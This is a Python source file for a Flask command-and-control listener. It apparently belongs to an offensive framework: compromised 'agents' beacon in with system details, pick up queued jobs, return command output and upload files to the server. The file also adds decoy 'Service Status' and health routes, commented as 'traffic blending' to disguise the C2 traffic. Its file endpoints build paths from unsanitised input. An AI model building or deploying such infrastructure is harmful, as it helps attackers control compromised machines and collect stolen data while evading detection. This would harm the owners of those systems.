#!/usr/bin/env python3
from flask import Flask, request, jsonify
import threading
import json
import time
from datetime import datetime

class HTTPListener:
    def __init__(self, host='0.0.0.0', port=6969):
        self.host = host
        self.port = port
        self.app = Flask(__name__)
        self.agents = {}
        self.jobs = {}
        self.running = False
        
        self.setup_routes()
    
    def setup_routes(self):
        """Setup HTTP routes for agent communication"""
        
        @self.app.route('/beacon', methods=['POST'])
        def beacon():
            """Agent check-in endpoint"""
            try:
                data = request.get_json()
                if not data:
                    return jsonify({'error': 'Invalid JSON'}), 400
                
                agent_id = data.get('agent_id')
                if not agent_id:
                    return jsonify({'error': 'Missing agent_id'}), 400
                
                print(f"[+] Beacon from agent: {agent_id}")
                
                # Store agent info
                self.agents[agent_id] = {
                    'last_seen': datetime.now(),
                    'system_info': data.get('system_info', {}),
                    'ip': request.remote_addr
                }
                
                # Check for pending jobs
                pending_jobs = self.jobs.get(agent_id, [])
                response = {'jobs': pending_jobs}
                
                # Clear delivered jobs
                if agent_id in self.jobs:
                    del self.jobs[agent_id]
                
                return jsonify(response)
                
            except Exception as e:
                print(f"[-] Beacon error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/result', methods=['POST'])
        def result():
            """Job result submission endpoint"""
            try:
                data = request.get_json()
                agent_id = data.get('agent_id')
                job_id = data.get('job_id')
                output = data.get('output')
                
                print(f"[+] Job result from {agent_id}: {job_id}")
                print(f"    Output: {output[:100]}..." if output else "    No output")
                
                return jsonify({'status': 'received'})
                
            except Exception as e:
                print(f"[-] Result error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/upload', methods=['POST'])
        def upload():
            """File upload endpoint"""
            try:
                if 'file' not in request.files:
                    return jsonify({'error': 'No file provided'}), 400
                
                file = request.files['file']
                agent_id = request.form.get('agent_id')
                filename = request.form.get('filename', file.filename)
                
                # Save uploaded file
                import os
                os.makedirs('uploads', exist_ok=True)
                save_path = f"uploads/{agent_id}_{filename}"
                file.save(save_path)
                
                print(f"[+] File uploaded from {agent_id}: {filename}")
                return jsonify({'status': 'success', 'path': save_path})
                
            except Exception as e:
                print(f"[-] Upload error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/download/<filename>', methods=['GET'])
        def download(filename):
            """File download endpoint"""
            try:
                from flask import send_file
                return send_file(f"uploads/{filename}", as_attachment=True)
            except Exception as e:
                return jsonify({'error': str(e)}), 404
        
        # Add some benign-looking routes for traffic blending
        @self.app.route('/')
        def index():
            return "Service Status: OK"
        
        @self.app.route('/health')
        def health():
            return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})
    
    def create_job(self, agent_id, module_name, arguments=None):
        """Create a job for an agent"""
        job_id = f"job_{len(self.jobs.get(agent_id, [])) + 1}"
        job = {
            'job_id': job_id,
            'module_name': module_name,
            'arguments': arguments or {}
        }
        
        if agent_id not in self.jobs:
            self.jobs[agent_id] = []
        
        self.jobs[agent_id].append(job)
        return job_id
    
    def start(self):
        """Start the HTTP listener in a separate thread"""
        if self.running:
            print("[-] Listener already running")
            return
        
        print(f"[+] Starting HTTP listener on {self.host}:{self.port}")
        self.running = True
        
        # Run Flask in a separate thread with proper error handling
        def run_flask():
            try:
                self.app.run(
                    host=self.host,
                    port=self.port,
                    debug=False,
                    threaded=True,
                    use_reloader=False  # Important: prevents double startup
                )
            except Exception as e:
                print(f"[-] Flask listener crashed: {e}")
                self.running = False
        
        self.flask_thread = threading.Thread(target=run_flask)
        self.flask_thread.daemon = True
        self.flask_thread.start()
        
        # Wait a moment for Flask to start
        time.sleep(2)
        
        # Check if it's running
        if self.flask_thread.is_alive():
            print(f"[✓] HTTP listener successfully started on {self.host}:{self.port}")
        else:
            print(f"[-] HTTP listener failed to start")
    
    def stop(self):
        """Stop the HTTP listener"""
        self.running = False
        print("[+] HTTP listener stopped")

# Test the listener directly
if __name__ == "__main__":
    print("[*] Testing HTTP listener standalone...")
    listener = HTTPListener(host='0.0.0.0', port=6969)
    listener.start()
    
    try:
        # Keep the main thread alive
        while listener.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping listener...")
        listener.stop()